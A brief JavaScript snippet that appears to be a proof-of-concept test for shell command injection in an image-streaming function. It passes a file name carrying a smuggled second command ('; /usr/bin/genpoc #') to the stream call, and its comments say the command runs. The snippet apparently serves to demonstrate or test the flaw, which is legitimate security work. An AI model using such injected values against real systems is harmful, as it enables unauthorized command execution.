  // By injecting a shell metacharacter, we break out of the intended argument scope.
  const maliciousPayload = `untrusted-image.jpg; /usr/bin/genpoc #`;

  // Triggering the stream operation with unsanitized input executes the injected command.
  // Exceptions are intentionally left to propagate to visible failure states.
  await (typeof imageStream === 'function' ? imageStream : imageStream.stream)(maliciousPayload);
